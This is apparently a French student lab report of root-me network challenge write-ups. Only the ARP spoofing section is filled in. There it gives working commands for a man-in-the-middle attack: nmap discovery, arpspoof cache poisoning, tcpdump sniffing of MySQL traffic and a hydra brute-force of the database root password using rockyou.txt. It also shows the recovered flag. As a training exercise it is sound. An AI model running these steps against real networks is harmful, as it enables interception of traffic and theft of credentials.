# TP6 : Un peu de root-me


## Sommaire

- [TP6 : Un peu de root-me](#tp6--un-peu-de-root-me)
  - [Sommaire](#sommaire)
  - [I. DNS Rebinding](#i-dns-rebinding)
  - [II. Netfilter erreurs courantes](#ii-netfilter-erreurs-courantes)
  - [III. ARP Spoofing Ecoute active](#iii-arp-spoofing-ecoute-active)
  - [IV. Bonus : Trafic Global System for Mobile communications](#iv-bonus--trafic-global-system-for-mobile-communications)

## I. DNS Rebinding

> [**Lien vers l'épreuve root-me.**](https://www.root-me.org/fr/Challenges/Reseau/HTTP-DNS-Rebinding)


🌞 **Write-up de l'épreuve**

🌞 **Proposer une version du code qui n'est pas vulnérable**


## II. Netfilter erreurs courantes

> [**Lien vers l'épreuve root-me.**](https://www.root-me.org/fr/Challenges/Reseau/Netfilter-erreurs-courantes)


🌞 **Write-up de l'épreuve**

🌞 **Proposer un jeu de règles firewall**


## III. ARP Spoofing Ecoute active

> [**Lien vers l'épreuve root-me.**](https://www.root-me.org/fr/Challenges/Reseau/ARP-Spoofing-Ecoute-active)

🌞 **Write-up de l'épreuve**

### Le but de ce chall est de récupérer des informations confidentielles qui transitent sur un réseau, et nous avons accès à ce réseau à travers une machine que nous contrôlons.

On nous dit que le flag est la concaténation de la réponse à une requête sur le réseau, ainsi que le mot de passe de la base de données. On va donc mettre en place un man-in-the-middle pour trouver la première partie, puis on va brute force le mdp de la base de donnée pour la seconde partie. 

```
# apt install iproute2 -y

# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever

```
Nous allons commencer par scanner le réseau local afin de voir les machines qui y sont présentes.
```
# apt install nmap -y

# nmap -sn 172.18.0.0/16
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-04 15:18 UTC
Nmap scan report for 172.18.0.1
Host is up (0.000032s latency).
MAC Address: 02:42:D5:43:77:9E (Unknown)
Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.3)
Host is up (0.000031s latency).
MAC Address: 02:42:AC:12:00:03 (Unknown)
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.4)
Host is up (0.000036s latency).
MAC Address: 02:42:AC:12:00:04 (Unknown)
Nmap scan report for fac50de5d760 (172.18.0.2)
Host is up.
```
On voit deux machines distinctes, un client en 172.18.0.3, et une base de données en 172.18.0.4. 

Nous allons ensuite mettre en place un man-in-the-middle entre ces deux machines, afin de pouvoir consulter le trafic qui passe. Nous allons utiliser la technique du ARP poisoning afin que le client pense que nous sommes la DB, et que la DB pense que nous sommes le client.
```
# cat /proc/sys/net/ipv4/ip_forward
1
```
On regarde si le forwarding de paquet est activé, sans cela les paquets ne pourront pas transiter à travers notre machine et ainsi atteindre leur cible originelle.

 Dans un deuxième temps, nous allons utiliser “arpspoof” pour envoyer continuellement des paquets ARP qui vont falsifier la table ARP du  client, et de la DB. 
 
```
# arpspoof -t 172.18.0.3 -r 172.18.0.4
2:42:ac:12:0:2 2:42:ac:12:0:3 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:2
2:42:ac:12:0:2 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.3 is-at 2:42:ac:12:0:2
```

```
# nmap 172.18.0.4
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-04 15:29 UTC
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.4)
Host is up (0.000037s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:AC:12:00:04 (Unknown)
Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds

# apt install dsniff tcpdump -y

# tcpdump -A port 3306


first part of the flag: l1tter4lly_4_c4ptur3_th3_fl4g

#wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

#apt install hydra -y

# hydra -l root -P rockyou.txt 172.18.0.4 mysql

[3306][mysql] host: 172.18.0.4   login: root   password: heyheyhey

Flag: l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey

```

🌞 **Proposer une configuration pour empêcher votre attaque**


## IV. Bonus : Trafic Global System for Mobile communications

> [**Lien vers l'épreuve root-me.**](https://www.root-me.org/fr/Challenges/Reseau/Trafic-Global-System-for-Mobile-communications)

⭐ **BONUS : Write-up de l'épreuve**
